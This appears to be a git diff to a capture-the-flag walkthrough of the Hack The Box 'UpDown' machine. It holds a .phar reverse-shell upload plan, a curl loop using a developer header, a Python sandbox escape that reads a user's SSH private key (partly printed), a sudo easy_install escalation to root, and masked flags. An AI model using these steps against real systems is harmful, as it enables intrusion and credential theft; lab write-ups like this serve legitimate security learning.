@@ -262,6 +262,14 @@ function getExtension($file) {
 </html>
 ```
 
+Now we can take everything that checker.php is checking for and form our payload.
+
+
+1. I Added lots of websites to look at so I would have more time to navigate to the file upload since it gets deleted very quickly. 
+2. Create it as a .phar file
+3. Use a proc_open script with your reverse shell.
+4. Make sure your burp suite is ready to go with ```Special-Dev: only4dev```
+5. Alternatively you can run this Curl command from another user ```curl -H 'Special-Dev: only4dev' -s http://dev.siteisup.htb/uploads/ | grep "\[DIR\]" | cut -d "\"" -f 8 > folder-names; while read -r line; do curl -v -H 'Special-Dev: only4dev' "http://dev.siteisup.htb/uploads/${line}<PHAR-FILE-NAME>.phar"; done < folder-names``` and it should work but I have not tested.
 
 https://www.php.net/manual/en/function.proc-open.php
 
@@ -339,22 +347,21 @@ $ python3 -c 'import pty; pty.spawn("/bin/bash")'
 www-data@updown:/tmp$ 
 ```
 
-╔══════════╣ Sudo version
-╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version
-Sudo version 1.8.31
+The files inside /home/developer look interesting
 
-╔══════════╣ CVEs Check
-Vulnerable to CVE-2021-3560
-
-
-```╔══════════╣ Files inside others home (limit 20)
-/home/developer/dev/siteisup_test.py
-/home/developer/dev/siteisup
-/home/developer/.profile
-/home/developer/user.txt
-/home/developer/.bashrc
-/home/developer/.bash_logout
 ```
+www-data@updown:/tmp$ ls -la /home/developer/dev
+total 32
+drwxr-x--- 2 developer www-data   4096 Jun 22 15:45 .
+drwxr-xr-x 6 developer developer  4096 Aug 30 11:24 ..
+-rwsr-x--- 1 developer www-data  16928 Jun 22 15:45 siteisup
+-rwxr-x--- 1 developer www-data    154 Jun 22 15:45 siteisup_test.py
+
+```
+
+This file siteisup_test.py is actually vulnerable to a python sandbox escape, more info is linked below. Also the binary ./siteisup will call on this file.
+
+https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes
 
 
 ```
@@ -370,7 +377,7 @@ else:
 	print "Website is down"
 ```
 
-https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes
+So very simply all we have to do is abuse the import module for command execution on the system.
 
 
 ```
@@ -380,6 +387,7 @@ Welcome to 'siteisup.htb' application
 
 Enter URL here:__import__('os').system('cat /home/developer/.ssh/id_rsa')
 ```
+Just like that we get the users key :)
 
 ```
 -----BEGIN OPENSSH PRIVATE KEY-----
@@ -422,8 +430,9 @@ N4jA+ppn1+3e0AAAASZGV2ZWxvcGVyQHNpdGVpc3VwAQ==
 -----END OPENSSH PRIVATE KEY-----
 ```
 
+This next part is even easier and a bit underwhelming.
 
-
+Running sudo -l shows we have sudo rights for easy_install.
 
 
 ```console
@@ -437,7 +446,11 @@ User developer may run the following commands on localhost:
 ```
 
 
+If we go and check out easy_install on GTFObins we get a quick sudo command for PE
+
 https://gtfobins.github.io/gtfobins/easy_install/
+
+Input the command and we have root!
 
 ```
 developer@updown:~$ TF=$(mktemp -d)
@@ -451,9 +464,13 @@ Running setup.py -q bdist_egg --dist-dir /tmp/tmp.SizFBjbMBL/egg-dist-tmp-CEKvME
 uid=0(root) gid=0(root) groups=0(root)
 # 
 ```
+Cat the flags and we are done!
+
 ```console
 # cat user.txt
 673b7***************************
 # cat /root/root.txt
 f2072***************************
 ```
+
+GG!
